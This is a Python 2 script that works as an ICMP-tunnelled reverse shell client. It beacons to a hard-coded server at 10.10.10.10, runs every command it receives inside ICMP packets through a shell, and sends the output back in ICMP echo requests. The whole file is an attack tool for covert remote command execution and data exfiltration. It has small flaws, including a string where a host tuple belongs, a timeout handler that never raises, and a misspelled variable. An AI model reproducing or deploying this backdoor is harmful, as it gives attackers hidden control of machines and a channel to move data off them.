#!/usr/bin/env python2
import rlib
import os
import sys
import socket
import struct
import binascii
import subprocess

import time
import select
import random
import asyncore

ICMP_ECHO_REQUEST = 8

server_IP = '("10.10.10.10",0)' ## server IP and random port

ICMP_CODE = socket.getprotobyname('icmp')

import signal

class timeout:
    def __init__(self, seconds=1, error_message='Timeout'):
        self.seconds = seconds
        self.error_message = error_message
    def handle_timeout(self, signum, frame):
        TimeoutError(self.error_message)
    def __enter__(self):
        signal.signal(signal.SIGALRM, self.handle_timeout)
        signal.alarm(self.seconds)
    def __exit__(self, type, value, traceback):
        signal.alarm(0)

class TimeoutError(Exception):
	pass


#############Creation of the socket and send to our server the wordpass###############
soc = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)

type = 8
code = 0
check = 0
id = 1111
seq = 2222
data = binascii.unhexlify("6869")

def checksum(source_string):
    sum = 0
    count_to = (len(source_string) / 2) * 2
    count = 0
    while count < count_to:
        this_val = ord(source_string[count + 1])*256+ord(source_string[count])
        sum = sum + this_val
        sum = sum & 0xffffffff # Necessary?
        count = count + 2
    if count_to < len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff # Necessary?
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer


def create_packet(id, data):
    # Header is type (8), code (8), checksum (16), id (16), sequence (16)
    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, 0, id, 1)

    my_checksum = checksum(header + data)

    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0,
                         socket.htons(my_checksum), id, 1)
    return header + data


packet_id = 1515
packet = create_packet(packet_id, data)
while packet:
		sent = soc.sendto(packet, server_IP)
		packet = packet[sent:]


################Get From Our Server Data + The Margin Mark From Where To Start Pick Data + Transfer To Our Shell The Data#############
while True:
	with timeout(seconds=15):
		try:
			rt = soc.recv(6500)
		except:
			break
		q = struct.unpack("2s", rt[28:30])
		if str(q[0]) == "hi" or str(q[0]) == "ho" or str(q[0]) == "hp":
			continue
		at = int(rt[28:30])
		print rt[30:at+30]
		cmd = subprocess.Popen(rt[30:at+30], shell=True,stdin=None,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
		o,r = cmd.communicate()
		rr = o+r

		pakcet_id = 1515
		packet = create_packet(packet_id, rr)
		while packet:
			sent = soc.sendto(packet, server_IP)
			packet = packet[sent:]
